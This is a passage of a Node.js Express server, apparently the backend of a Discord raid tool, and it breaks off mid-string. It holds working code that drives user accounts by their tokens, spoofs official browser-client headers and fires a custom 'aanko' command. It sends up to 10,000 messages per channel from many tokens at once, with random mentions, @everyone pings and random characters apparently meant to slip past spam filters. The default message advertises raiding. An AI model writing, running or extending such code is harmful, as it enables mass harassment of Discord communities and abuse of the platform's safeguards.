        console.error('Error searching:', error.response?.data || error.message);
        res.status(error.response?.status || 500).json({ 
            success: false,
            error: error.response?.data?.message || error.message 
        });
    }
});

app.post('/api/test-send-message', async (req, res) => {
    try {
        const { token, channelId, message } = req.body;

        if (!token || !channelId) {
            return res.status(400).json({ error: 'Token and channelId are required' });
        }

        const generateRandomString = () => {
            const charSets = {
                latin: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
                japanese: 'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
                symbols: '!@#$%^&*()_+-=[]{}|;:,.<>?/~`',
                cyrillic: 'абвгдежзийклмнопрстуфхцчшщъыьэюя',
                greek: 'αβγδεζηθικλμνξοπρστυφχψω',
                emoji: '😀😁😂😃😄😅🤣😆😉😊😌🙂🤗💜❤️🔥⭐✨🎉🎊💯'
            };
            
            const allChars = Object.values(charSets).join('');
            let result = '';
            for (let i = 0; i < 64; i++) {
                result += allChars[Math.floor(Math.random() * allChars.length)];
            }
            return result;
        };

        const randomString = generateRandomString();
        const finalMessage = (message || 'デフォルト5') + '\n' + randomString;

        const headers = getDiscordHeaders(token);

        const response = await axios.post(
            `${DISCORD_API_BASE}/channels/${channelId}/messages`,
            { 
                content: finalMessage,
                allowed_mentions: { parse: ['everyone', 'users', 'roles'] }
            },
            { headers }
        );

        res.json({
            success: true,
            messageId: response.data.id
        });

    } catch (error) {
        console.error('Error sending test message:', error.response?.data || error.message);
        res.status(error.response?.status || 500).json({ 
            success: false,
            error: error.response?.data?.message || 'Failed to send message' 
        });
    }
});

app.post('/api/get-channel-info', async (req, res) => {
    try {
        const { token, channelId } = req.body;

        if (!token || !channelId) {
            return res.status(400).json({ error: 'Token and channelId are required' });
        }

        const headers = getDiscordHeaders(token);
        const response = await axios.get(`${DISCORD_API_BASE}/channels/${channelId}`, { headers });
        
        res.json({
            success: true,
            guildId: response.data.guild_id || null,
            channelName: response.data.name,
            channelType: response.data.type
        });
    } catch (error) {
        console.error('Error getting channel info:', error.response?.data || error.message);
        res.status(error.response?.status || 500).json({ 
            success: false,
            error: error.response?.data?.message || 'Failed to get channel info' 
        });
    }
});

app.post('/api/get-text-channels', async (req, res) => {
    try {
        const { token, guildId, skipFilter, externalAppsOnly } = req.body;
        
        if (!token || !guildId) {
            return res.status(400).json({ error: 'Token and guildId are required' });
        }
        
        const headers = getDiscordHeaders(token);
        
        // skipFilter=true の場合はフィルターなしで全チャンネルを返す（直接メッセージ用）
        if (skipFilter) {
            const response = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}/channels`, { headers });
            const allChannels = response.data.filter(channel => channel.type === 0);
            
            const channels = allChannels.map(channel => ({
                id: channel.id,
                name: channel.name,
                slowMode: channel.rate_limit_per_user || 0
            }));
            
            console.log(`[get-text-channels] skipFilter=true: Returning all ${channels.length} text channels without filtering`);
            
            return res.json({
                success: true,
                channels: channels,
                totalFound: channels.length,
                skipped: {
                    noViewAccess: [],
                    noSendMessages: [],
                    noAppCommands: []
                }
            });
        }
        
        const VIEW_CHANNEL = 1024n;
        const SEND_MESSAGES = 2048n;
        const USE_APPLICATION_COMMANDS = 2147483648n;
        const USE_EXTERNAL_APPS = 1125899906842624n;
        
        const ADMINISTRATOR = 8n;
        
        let userRoleIds = [];
        let userId = null;
        let basePermissions = 0n;
        let isAdmin = false;
        
        try {
            const meResponse = await axios.get(`${DISCORD_API_BASE}/users/@me`, { headers });
            userId = meResponse.data.id;
            
            const memberResponse = await axios.get(`${DISCORD_API_BASE}/users/@me/guilds/${guildId}/member`, { headers });
            userRoleIds = memberResponse.data.roles || [];
            
            const rolesResponse = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}/roles`, { headers });
            const guildRoles = rolesResponse.data;
            const roleMap = new Map();
            guildRoles.forEach(r => roleMap.set(r.id, r));
            
            const everyoneRole = roleMap.get(guildId);
            if (everyoneRole) {
                basePermissions = BigInt(everyoneRole.permissions || '0');
            }
            
            for (const roleId of userRoleIds) {
                const role = roleMap.get(roleId);
                if (role) {
                    basePermissions |= BigInt(role.permissions || '0');
                }
            }
            
            isAdmin = (basePermissions & ADMINISTRATOR) !== 0n;
            if (isAdmin) {
                console.log('[get-text-channels] User is admin, skipping permission filtering');
            }
        } catch (e) {
            console.log('Could not fetch user roles, using default base permissions:', e.message);
            basePermissions = VIEW_CHANNEL | SEND_MESSAGES | USE_APPLICATION_COMMANDS;
        }
        
        const response = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}/channels`, { headers });
        
        const allChannels = response.data.filter(channel => channel.type === 0);
        
        const filteredChannels = [];
        const skippedChannels = { noView: [], noSendMessages: [], noAppCommands: [] };
        
        for (const channel of allChannels) {
            const slowModeSeconds = channel.rate_limit_per_user || 0;
            
            if (isAdmin) {
                filteredChannels.push({ 
                    id: channel.id, 
                    name: channel.name,
                    slowMode: slowModeSeconds
                });
                continue;
            }
            
            const overwrites = channel.permission_overwrites || [];
            
            let permissions = basePermissions;
            
            const everyoneOverwrite = overwrites.find(o => o.id === guildId);
            if (everyoneOverwrite) {
                permissions &= ~BigInt(everyoneOverwrite.deny || '0');
                permissions |= BigInt(everyoneOverwrite.allow || '0');
            }
            
            let roleAllow = 0n;
            let roleDeny = 0n;
            for (const roleId of userRoleIds) {
                const roleOverwrite = overwrites.find(o => o.id === roleId && o.type === 0);
                if (roleOverwrite) {
                    roleAllow |= BigInt(roleOverwrite.allow || '0');
                    roleDeny |= BigInt(roleOverwrite.deny || '0');
                }
            }
            permissions &= ~roleDeny;
            permissions |= roleAllow;
            
            if (userId) {
                const userOverwrite = overwrites.find(o => o.id === userId && o.type === 1);
                if (userOverwrite) {
                    permissions &= ~BigInt(userOverwrite.deny || '0');
                    permissions |= BigInt(userOverwrite.allow || '0');
                }
            }
            
            const hasViewChannel = (permissions & VIEW_CHANNEL) !== 0n;
            const hasSendMessages = (permissions & SEND_MESSAGES) !== 0n;
            const hasAppCommands = (permissions & USE_APPLICATION_COMMANDS) !== 0n;
            const hasExternalApps = (permissions & USE_EXTERNAL_APPS) !== 0n;
            
            if (!hasViewChannel) {
                skippedChannels.noView.push({ id: channel.id, name: channel.name, slowMode: slowModeSeconds });
                continue;
            }
            
            if (!hasSendMessages) {
                skippedChannels.noSendMessages.push({ id: channel.id, name: channel.name, slowMode: slowModeSeconds });
                continue;
            }
            
            // Only require external apps permission for external bot commands
            // (app commands permission is only for server's own slash commands)
            if (!hasExternalApps) {
                skippedChannels.noAppCommands.push({ id: channel.id, name: channel.name, slowMode: slowModeSeconds });
                continue;
            }
            
            filteredChannels.push({
                id: channel.id,
                name: channel.name,
                slowMode: slowModeSeconds
            });
        }
        
        console.log(`[get-text-channels] Found ${allChannels.length} text channels, filtered to ${filteredChannels.length}`);
        console.log(`[get-text-channels] Skipped: ${skippedChannels.noView.length} (no view), ${skippedChannels.noSendMessages.length} (no send), ${skippedChannels.noAppCommands.length} (no external apps)`);
        
        res.json({
            success: true,
            channels: filteredChannels,
            totalFound: allChannels.length,
            skipped: {
                noViewAccess: skippedChannels.noView,
                noSendMessages: skippedChannels.noSendMessages,
                noAppCommands: skippedChannels.noAppCommands
            }
        });
        
    } catch (error) {
        console.error('Error fetching channels:', error.response?.data || error.message);
        res.status(error.response?.status || 500).json({ 
            success: false,
            error: error.response?.data?.message || 'Failed to fetch channels' 
        });
    }
});

app.post('/api/get-thread-channels', async (req, res) => {
    try {
        const { token, guildId } = req.body;
        
        if (!token || !guildId) {
            return res.status(400).json({ error: 'Token and guildId are required' });
        }
        
        const headers = getDiscordHeaders(token);
        
        const VIEW_CHANNEL = 1024n;
        const SEND_MESSAGES = 2048n;
        const CREATE_PUBLIC_THREADS = 34359738368n;
        const ADMINISTRATOR = 8n;
        
        let userRoleIds = [];
        let userId = null;
        let basePermissions = 0n;
        let isAdmin = false;
        
        try {
            const meResponse = await axios.get(`${DISCORD_API_BASE}/users/@me`, { headers });
            userId = meResponse.data.id;
            
            const memberResponse = await axios.get(`${DISCORD_API_BASE}/users/@me/guilds/${guildId}/member`, { headers });
            userRoleIds = memberResponse.data.roles || [];
            
            const rolesResponse = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}/roles`, { headers });
            const guildRoles = rolesResponse.data;
            const roleMap = new Map();
            guildRoles.forEach(r => roleMap.set(r.id, r));
            
            const everyoneRole = roleMap.get(guildId);
            if (everyoneRole) {
                basePermissions = BigInt(everyoneRole.permissions || '0');
            }
            
            for (const roleId of userRoleIds) {
                const role = roleMap.get(roleId);
                if (role) {
                    basePermissions |= BigInt(role.permissions || '0');
                }
            }
            
            isAdmin = (basePermissions & ADMINISTRATOR) !== 0n;
        } catch (e) {
            console.log('Could not fetch user roles:', e.message);
            return res.status(500).json({ 
                success: false, 
                error: 'Failed to fetch user permissions. Please try again.' 
            });
        }
        
        const response = await axios.get(`${DISCORD_API_BASE}/guilds/${guildId}/channels`, { headers });
        const allChannels = response.data.filter(channel => channel.type === 0);
        
        const filteredChannels = [];
        
        for (const channel of allChannels) {
            if (isAdmin) {
                filteredChannels.push({ id: channel.id, name: channel.name });
                continue;
            }
            
            const overwrites = channel.permission_overwrites || [];
            let permissions = basePermissions;
            
            const everyoneOverwrite = overwrites.find(o => o.id === guildId && o.type === 0);
            if (everyoneOverwrite) {
                permissions &= ~BigInt(everyoneOverwrite.deny || '0');
                permissions |= BigInt(everyoneOverwrite.allow || '0');
            }
            
            let roleAllow = 0n;
            let roleDeny = 0n;
            for (const roleId of userRoleIds) {
                const roleOverwrite = overwrites.find(o => o.id === roleId && o.type === 0);
                if (roleOverwrite) {
                    roleAllow |= BigInt(roleOverwrite.allow || '0');
                    roleDeny |= BigInt(roleOverwrite.deny || '0');
                }
            }
            permissions &= ~roleDeny;
            permissions |= roleAllow;
            
            if (userId) {
                const userOverwrite = overwrites.find(o => o.id === userId && o.type === 1);
                if (userOverwrite) {
                    permissions &= ~BigInt(userOverwrite.deny || '0');
                    permissions |= BigInt(userOverwrite.allow || '0');
                }
            }
            
            const hasViewChannel = (permissions & VIEW_CHANNEL) !== 0n;
            const hasSendMessages = (permissions & SEND_MESSAGES) !== 0n;
            const hasCreateThreads = (permissions & CREATE_PUBLIC_THREADS) !== 0n;
            
            if (hasViewChannel && hasSendMessages && hasCreateThreads) {
                filteredChannels.push({ id: channel.id, name: channel.name });
            }
        }
        
        console.log(`[get-thread-channels] Found ${filteredChannels.length}/${allChannels.length} thread-capable channels`);
        
        res.json({
            success: true,
            channels: filteredChannels
        });
        
    } catch (error) {
        console.error('Error fetching thread channels:', error.response?.data || error.message);
        res.status(error.response?.status || 500).json({ 
            success: false,
            error: error.response?.data?.message || 'Failed to fetch channels' 
        });
    }
});

app.post('/api/execute-aanko', async (req, res) => {
    try {
        let { token, channelId, guildId, userIds, mentionCount, message } = req.body;

        if (!token || !channelId) {
            return res.status(400).json({ error: 'Token and channelId are required' });
        }

        const headers = getDiscordHeaders(token);

        if (!guildId) {
            try {
                const channelResponse = await axios.get(`${DISCORD_API_BASE}/channels/${channelId}`, { headers });
                guildId = channelResponse.data.guild_id;
                console.log('Auto-fetched guild_id:', guildId);
            } catch (channelError) {
                console.error('Could not fetch channel info:', channelError.response?.data || channelError.message);
            }
        }

        let aankoCommand = getRegisteredCommand();
        
        if (!aankoCommand) {
            console.log('No registered command found, cannot execute');
            return res.status(500).json({ 
                success: false,
                error: 'Bot command not registered yet. Please wait a moment and try again.' 
            });
        }
        
        console.log('Using registered aanko command:', aankoCommand.id, aankoCommand.version);

        const generateSnowflake = () => {
            const timestamp = BigInt(Date.now() - 1420070400000) << 22n;
            const random = BigInt(Math.floor(Math.random() * 4194304));
            return (timestamp | random).toString();
        };

        const generateSessionId = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 32; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            return result;
        };

        const generateBoundary = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 16; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            return result;
        };

        const sessionId = generateSessionId();
        const nonce = generateSnowflake();
        
        const options = [];
        
        if (message && message !== 'デフォルト6') {
            options.push({
                type: 3,
                name: 'message',
                value: message
            });
        }
        
        if (userIds && userIds.length > 0) {
            options.push({
                type: 3,
                name: 'user_ids',
                value: userIds.join(',')
            });
        }
        
        if (mentionCount) {
            options.push({
                type: 4,
                name: 'mention_count',
                value: mentionCount
            });
        }

        const payload = {
            type: 2,
            application_id: CLIENT_ID,
            channel_id: channelId,
            session_id: sessionId,
            nonce: nonce,
            data: {
                version: aankoCommand.version,
                id: aankoCommand.id,
                name: 'aanko',
                type: 1,
                options: options,
                application_command: aankoCommand
            }
        };

        if (guildId) {
            payload.guild_id = guildId;
        }

        const boundary = '----WebKitFormBoundary' + generateBoundary();
        const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(payload)}\r\n--${boundary}--`;

        const superProperties = {
            os: "Windows",
            browser: "Chrome",
            device: "",
            system_locale: "ja",
            browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            browser_version: "120.0.0.0",
            os_version: "10",
            referrer: "",
            referring_domain: "",
            referrer_current: "",
            referring_domain_current: "",
            release_channel: "stable",
            client_build_number: 251236,
            client_event_source: null
        };

        const execHeaders = {
            'Authorization': token,
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'X-Super-Properties': Buffer.from(JSON.stringify(superProperties)).toString('base64'),
            'X-Discord-Locale': 'ja',
            'X-Discord-Timezone': 'Asia/Tokyo',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        };

        console.log('Executing aanko with payload:', JSON.stringify(payload, null, 2));

        const response = await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, { headers: execHeaders });
        
        res.json({
            success: true,
            executed: 1,
            total: 1
        });

    } catch (error) {
        console.error('Error executing aanko:', error.response?.data || error.message);
        res.status(error.response?.status || 500).json({ 
            success: false,
            error: error.response?.data?.message || 'Failed to execute aanko command' 
        });
    }
});

app.post('/api/create-aanko-button', async (req, res) => {
    try {
        const { channelId, message, userIds, mentionCount } = req.body;

        if (!channelId) {
            return res.status(400).json({ error: 'channelId is required' });
        }

        const result = await createWebButton(channelId, message, userIds, mentionCount);
        
        if (result.success) {
            res.json(result);
        } else {
            res.status(500).json(result);
        }

    } catch (error) {
        console.error('Error creating aanko button:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

const generateRandomChars = (length = 64) => {
    const korean = 'ㄱㄴㄷㄹㅁㅂㅅㅇㅈㅊㅋㅌㅍㅎㅏㅓㅗㅜㅡㅣ가나다라마바사아자차카타파하';
    const chinese = '你好世界中国日本韩国爱心快乐幸福美丽天地人山水火风云雨雪花草树木金银铜铁';
    const english = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const allChars = korean + chinese + english;
    
    let result = '';
    for (let i = 0; i < length; i++) {
        result += allChars[Math.floor(Math.random() * allChars.length)];
    }
    return result;
};

const sendMessageWithUserToken = async (token, channelId, content) => {
    try {
        const response = await axios.post(
            `https://discord.com/api/v10/channels/${channelId}/messages`,
            { 
                content,
                allowed_mentions: { parse: ['everyone', 'users', 'roles'] }
            },
            {
                headers: {
                    'Authorization': token,
                    'Content-Type': 'application/json'
                }
            }
        );
        return { success: true, messageId: response.data.id };
    } catch (error) {
        console.error('Error sending message with user token:', error.response?.data || error.message);
        return { success: false, error: error.response?.data?.message || error.message };
    }
};

app.post('/api/execute-aanko-button', async (req, res) => {
    try {
        const { tokens, channelIds, message, userIds, mentionCount, messageCount, delayMs } = req.body;

        const tokenList = Array.isArray(tokens) ? tokens : (tokens ? [tokens] : []);
        if (tokenList.length === 0 || !channelIds || channelIds.length === 0) {
            return res.status(400).json({ error: 'tokens and channelIds are required' });
        }

        const channels = Array.isArray(channelIds) ? channelIds : [channelIds];
        const count = Math.min(Math.max(parseInt(messageCount) || 1, 1), 10000);
        const customMessage = message || '';
        const idsToMention = userIds || [];
        const mentionNum = Math.max(parseInt(mentionCount) || 0, 0);
        const msgDelay = Math.max(parseFloat(delayMs) || 100, 10);

        const results = { total: 0, success: 0, failed: 0, channels: {} };
        
        const sendWithRetry = async (token, channelId, content, maxRetries = 3) => {
            for (let attempt = 0; attempt < maxRetries; attempt++) {
                const result = await sendMessageWithUserToken(token, channelId, content);
                if (result.success) return { success: true };
                
                if (result.error && (result.error.includes('rate') || result.error.includes('429'))) {
                    const waitTime = 500 + (attempt * 500);
                    await delay(waitTime);
                    continue;
                }
                return { success: false, error: result.error };
            }
            return { success: false, error: 'Max retries exceeded' };
        };
        
        const sendToChannelWithToken = async (token, channelId) => {
            let channelSuccess = 0;
            let channelFailed = 0;
            
            for (let i = 0; i < count; i++) {
                let msgContent = customMessage;
                
                if (idsToMention.length > 0 && mentionNum > 0) {
                    const shuffled = [...idsToMention].sort(() => Math.random() - 0.5);
                    const selected = shuffled.slice(0, Math.min(mentionNum, shuffled.length));
                    const mentions = selected.map(id => `<@${id}>`).join(' ');
                    if (mentions) {
                        msgContent += (msgContent ? ' ' : '') + mentions;
                    }
                }
                
                msgContent += (msgContent ? ' ' : '') + generateRandomChars(64);
                
                const result = await sendWithRetry(token, channelId, msgContent);
                
                if (result.success) {
                    channelSuccess++;
                } else {
                    channelFailed++;
                }
                
                if (i < count - 1) {
                    await delay(msgDelay);
                }
            }
            
            return { channelId, success: channelSuccess, failed: channelFailed };
        };

        const allPromises = [];
        for (const token of tokenList) {
            for (const channelId of channels) {
                allPromises.push(sendToChannelWithToken(token, channelId));
            }
        }
        
        const allResults = await Promise.all(allPromises);
        
        allResults.forEach(r => {
            if (!results.channels[r.channelId]) {
                results.channels[r.channelId] = { success: 0, failed: 0 };
            }
            results.channels[r.channelId].success += r.success;
            results.channels[r.channelId].failed += r.failed;
            results.success += r.success;
            results.failed += r.failed;
            results.total += r.success + r.failed;
        });

        res.json({
            success: true,
            tokenCount: tokenList.length,
            ...results
        });

    } catch (error) {
        console.error('Error executing fast send:', error);
        res.status(500).json({ 
            success: false,
            error: error.message
        });
    }
});

app.post('/api/execute-aanko-command', async (req, res) => {
    try {
        const { token, channelId, guildId, message, userIds, mentionCount, count } = req.body;

        if (!token || !channelId) {
            console.log('DEBUG: Missing token or channelId');
            return res.status(400).json({ success: false, error: 'Token and channelId are required' });
        }

        const commandInfo = getRegisteredCommand();
        if (!commandInfo) {
            console.log('DEBUG: Command not registered');
            return res.status(500).json({ success: false, error: 'aanko command is not registered yet' });
        }

        const executeCount = Math.max(parseInt(count) || 1, 1);
        const results = [];
        
        const generateSnowflake = () => {
            const timestamp = BigInt(Date.now() - 1420070400000) << 22n;
            const random = BigInt(Math.floor(Math.random() * 4194304));
            return (timestamp | random).toString();
        };

        const generateSessionId = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 32; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            return result;
        };

        const generateBoundary = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 16; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            return result;
        };

        const sessionId = generateSessionId();
        
        const options = [];
        // Check if message contains @everyone to set the everyone option
        const includeEveryone = message && message.includes('@everyone');
        let cleanMessage = message;
        if (includeEveryone) {
            cleanMessage = message.replace(/@everyone\s*/g, '').trim();
        }
        if (cleanMessage) {
            options.push({ type: 3, name: 'message', value: cleanMessage });
        }
        if (userIds && userIds.length > 0) {
            options.push({ type: 3, name: 'user_ids', value: userIds.join(',') });
        }
        if (mentionCount && mentionCount > 0) {
            options.push({ type: 4, name: 'mention_count', value: mentionCount });
        }
        if (includeEveryone) {
            options.push({ type: 5, name: 'everyone', value: true });
        }

        for (let i = 0; i < executeCount; i++) {
            try {
                const nonce = generateSnowflake();
                
                const payload = {
                    type: 2,
                    application_id: CLIENT_ID,
                    channel_id: channelId,
                    session_id: sessionId,
                    nonce: nonce,
                    data: {
                        version: commandInfo.version,
                        id: commandInfo.id,
                        name: 'aanko',
                        type: 1,
                        options: options,
                        application_command: {
                            id: commandInfo.id,
                            application_id: CLIENT_ID,
                            version: commandInfo.version,
                            name: 'aanko',
                            description: 'ボタンを押すと6回メッセージを送信します',
                            type: 1,
                            options: commandInfo.options || [],
                            integration_types: [0, 1],
                            contexts: [0, 1, 2]
                        }
                    }
                };

                if (guildId) {
                    payload.guild_id = guildId;
                }

                const boundary = '----WebKitFormBoundary' + generateBoundary();
                const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(payload)}\r\n--${boundary}--`;

                const superProperties = {
                    os: "Windows",
                    browser: "Chrome",
                    device: "",
                    system_locale: "ja",
                    browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    browser_version: "120.0.0.0",
                    os_version: "10",
                    referrer: "",
                    referring_domain: "",
                    referrer_current: "",
                    referring_domain_current: "",
                    release_channel: "stable",
                    client_build_number: 251236,
                    client_event_source: null
                };

                const headers = {
                    'Authorization': token,
                    'Content-Type': `multipart/form-data; boundary=${boundary}`,
                    'X-Super-Properties': Buffer.from(JSON.stringify(superProperties)).toString('base64'),
                    'X-Discord-Locale': 'ja',
                    'X-Discord-Timezone': 'Asia/Tokyo',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Origin': 'https://discord.com',
                    'Referer': 'https://discord.com/channels/@me'
                };

                const response = await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, { headers });
                results.push({ success: true, index: i + 1 });
                
                if (i < executeCount - 1) {
                    await delay(2000 + Math.random() * 1000);
                }
            } catch (execError) {
                const errorData = execError.response?.data;
                console.error('Error executing aanko command:', errorData || execError.message);
                results.push({ 
                    success: false, 
                    index: i + 1, 
                    error: errorData?.message || execError.message,
                    code: errorData?.code
                });
                
                if (execError.response?.status === 429) {
                    const retryAfter = errorData?.retry_after || 5;
                    await delay(retryAfter * 1000);
                } else if (execError.response?.status >= 400) {
                    await delay(500);
                }
            }
        }

        const successCount = results.filter(r => r.success).length;
        res.json({
            success: true,
            executed: successCount,
            total: executeCount
        });

    } catch (error) {
        console.error('Error executing aanko command:', error.response?.data || error.message);
        if (!res.headersSent) {
            res.status(error.response?.status || 500).json({ 
                success: false,
                error: error.response?.data?.message || 'Failed to execute command' 
            });
        }
    }
});

app.post('/api/create-button-and-click', async (req, res) => {
    try {
        const { token, channelId, message, userIds, mentionCount, clickCount, clickDelayMs, guildId: providedGuildId } = req.body;

        if (!token || !channelId) {
            return res.status(400).json({ error: 'token and channelId are required' });
        }

        const headers = getDiscordHeaders(token);
        const count = Math.max(parseInt(clickCount) || 1, 1);
        const clickDelay = Math.max(parseFloat(clickDelayMs) || 500, 100);

        let guildId = providedGuildId;
        if (!guildId) {
            try {
                const channelResponse = await axios.get(`${DISCORD_API_BASE}/channels/${channelId}`, { headers });
                guildId = channelResponse.data.guild_id;
            } catch (e) {
                console.log('Could not fetch guild_id:', e.message);
            }
        }

        let aankoCommand = getRegisteredCommand();
        if (!aankoCommand) {
            return res.status(500).json({ 
                success: false,
                error: 'Bot command not registered yet. Please wait a moment and try again.' 
            });
        }

        const generateSnowflake = () => {
            const timestamp = BigInt(Date.now() - 1420070400000) << 22n;
            const random = BigInt(Math.floor(Math.random() * 4194304));
            return (timestamp | random).toString();
        };

        const generateSessionId = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 32; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            return result;
        };

        const generateBoundary = () => {
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 16; i++) {
                result += chars[Math.floor(Math.random() * chars.length)];
            }
            return result;
        };

        const sessionId = generateSessionId();
        
        const options = [];
        // Check if message contains @everyone to set the everyone option
        const includeEveryone = message && message.includes('@everyone');
        let cleanMessage = message;
        if (includeEveryone) {
            cleanMessage = message.replace(/@everyone\s*/g, '').trim();
        }
        if (cleanMessage && cleanMessage !== 'デフォルト6') {
            options.push({ type: 3, name: 'message', value: cleanMessage });
        }
        if (userIds && userIds.length > 0) {
            options.push({ type: 3, name: 'user_ids', value: userIds.join(',') });
        }
        if (mentionCount) {
            options.push({ type: 4, name: 'mention_count', value: mentionCount });
        }
        if (includeEveryone) {
            options.push({ type: 5, name: 'everyone', value: true });
        }

        const payload = {
            type: 2,
            application_id: CLIENT_ID,
            channel_id: channelId,
            session_id: sessionId,
            nonce: generateSnowflake(),
            data: {
                version: aankoCommand.version,
                id: aankoCommand.id,
                name: 'aanko',
                type: 1,
                options: options,
                application_command: aankoCommand
            }
        };
        if (guildId) payload.guild_id = guildId;

        const boundary = '----WebKitFormBoundary' + generateBoundary();
        const formBody = `--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n${JSON.stringify(payload)}\r\n--${boundary}--`;

        const execHeaders = {
            'Authorization': token,
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'X-Super-Properties': Buffer.from(JSON.stringify({
                os: "Windows", browser: "Chrome", device: "", system_locale: "ja",
                browser_user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                browser_version: "120.0.0.0", os_version: "10", release_channel: "stable",
                client_build_number: 251236, client_event_source: null
            })).toString('base64'),
            'X-Discord-Locale': 'ja',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Origin': 'https://discord.com',
            'Referer': 'https://discord.com/channels/@me'
        };

        const commandStartTime = Date.now();
        console.log('Step 1: Executing /aanko command to create button...');
        let commandResponse;
        try {
            commandResponse = await axios.post(`${DISCORD_API_BASE}/interactions`, formBody, { headers: execHeaders });
            console.log('Command response status:', commandResponse.status);
            if (commandResponse.data) {
                console.log('Command response has data:', JSON.stringify(commandResponse.data).substring(0, 500));
            }
        } catch (cmdError) {
            console.error('Command execution error:', cmdError.response?.data || cmdError.message);
            throw cmdError;
        }
        
        console.log('Step 2: Polling for stored button data (supports ephemeral messages)...');
        let buttonMessageId = null;
        let buttonCustomId = null;
        let storedButtonData = null;
        
        const maxPollingAttempts = 20;
        const pollingInterval = 250;
        
        for (let attempt = 0; attempt < maxPollingAttempts; attempt++) {
            await delay(pollingInterval);
            
            storedButtonData = getRecentButtonCreation(channelId);
            if (storedButtonData && storedButtonData.buttonCustomId) {
                if (storedButtonData.createdAt && storedButtonData.createdAt >= commandStartTime) {
                    buttonCustomId = storedButtonData.buttonCustomId;
                    if (storedButtonData.messageId && !storedButtonData.messageId.startsWith('pending_')) {
                        buttonMessageId = storedButtonData.messageId;
                        console.log(`Found NEW button data on attempt ${attempt + 1}: messageId=${buttonMessageId}, customId=${buttonCustomId}`);
                        break;
                    } else {
                        console.log(`Found button data with pending message on attempt ${attempt + 1}, waiting for real messageId...`);
                    }
                } else {
                    console.log(`Found OLD button data on attempt ${attempt + 1}, waiting for new data...`);
                }
            }
        }
        
        if (!buttonMessageId || !buttonCustomId) {
            console.log('Stored button not found, falling back to channel search...');
            try {
                const messagesResponse = await axios.get(
                    `${DISCORD_API_BASE}/channels/${channelId}/messages?limit=10`,
                    { headers }
                );
                
                for (const msg of messagesResponse.data) {
                    if (msg.author.id === CLIENT_ID && msg.components && msg.components.length > 0) {
                        for (const row of msg.components) {
                            if (row.components) {
                                for (const component of row.components) {
                                    if (component.type === 2 && component.custom_id && 
                                        (component.custom_id.startsWith('aanko_t_') || component.custom_id.startsWith('aanko_p_'))) {
                                        buttonMessageId = msg.id;
                                        buttonCustomId = component.custom_id;
                                        break;
                                    }
                                }
                            }
                            if (buttonCustomId) break;
                        }
                        if (buttonCustomId) break;
                    }
                }
            } catch (e) {
                console.error('Error finding button message:', e.message);
            }
        }

        if (!buttonMessageId || !buttonCustomId) {
            return res.json({
                success: true,
                executed: 0,
                total: count,
                isEphemeral: true,
                message: 'Button created but could not find it. This may be an ephemeral (invisible to others) button. Try enabling external app commands in server settings.'
            });
        }

        if (buttonCustomId.startsWith('aanko_t_') && !storedButtonData) {
            const parts = buttonCustomId.replace('aanko_t_', '').split('_');
            const buttonToken = parts[0];
            
            const idsToMention = userIds || [];
            console.log(`Storing button payload for token=${buttonToken}, userIds=${idsToMention.length}`);
            
            storeButtonPayload(buttonToken, {
                message: message || `# [あんこちゃんですあんこ鯖では主にピクセルガンの無償代行や荒らしを行っていますスマホ勢荒らし知識がなくても自作あんこアプリで初日から最強荒らし勢になろうピクセルガンも初日で最強になろう](<https://nemtudo.me/e/ryNa>)
